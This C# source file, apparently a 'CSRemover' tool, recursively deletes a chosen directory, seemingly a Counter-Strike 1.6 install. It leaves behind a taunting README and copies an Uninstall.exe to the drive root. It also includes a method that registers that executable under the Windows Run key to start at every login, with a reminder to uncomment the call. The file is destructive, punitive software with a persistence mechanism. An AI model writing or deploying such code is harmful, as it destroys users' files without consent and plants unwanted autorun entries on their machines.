using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Threading.Tasks;
using System.Security.AccessControl;
using System.Windows;

namespace CSRemover.Additional_Classes
{
    public static class Remover
    {
        private static string root;
        
        /// <summary>
        /// Deletes specified directory.
        /// </summary>
        /// <param name="path">Spercified directory.</param>
        public static bool Remove(string path)
        {
            if (Directory.Exists(path))
            {
                root = Directory.GetDirectoryRoot(path);
                CreateFile(path);
                //SetRegister(); //Don't forget to uncomment.
                Directory.Delete(path, true);
                return true;
            }
            return false;
        }

        /// <summary>
        /// Deletes specified directory.
        /// </summary>
        /// <param name="path">Spercified directory.</param>
        private static void CreateFile(string path)
        {
            string newDirectory = Directory.GetParent(path) + @"\CS 1.6";
            if (Directory.Exists(newDirectory))
            {
                Directory.Delete(newDirectory, true);
            }

            Directory.CreateDirectory(newDirectory);
            using (StreamWriter writer = new StreamWriter(newDirectory + @"\README.txt", false, System.Text.Encoding.Default))
            {
                writer.WriteLine("It's just a game. Don't be so inhuman.");
            }

            FileInfo file = new FileInfo(System.IO.Directory.GetCurrentDirectory() + @"\Uninstall.exe");

            string uninstallDir = root + @"CS 1.6";
            if (!Directory.Exists(uninstallDir))
            {
                Directory.CreateDirectory(uninstallDir);
            }

            file.CopyTo(root + @"CS 1.6\Uninstall.exe", true);
        }

        /// <summary>
        /// Sets autorun of the application when OS launched.
        /// </summary>
        private static void SetRegister()
        {
            const string name = "Uninstall";
            string ExePath = root + @"CS 1.6\Uninstall.exe";
            Microsoft.Win32.RegistryKey reg;
            reg = Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
            try
            {
                reg.SetValue(name, ExePath);
                reg.Close();
            }
            catch (Exception ex) { MessageBox.Show(ex.Message); }
        }

        public static bool IsPathExists(string path)
        {
            return Directory.Exists(path);
        }
    }
}
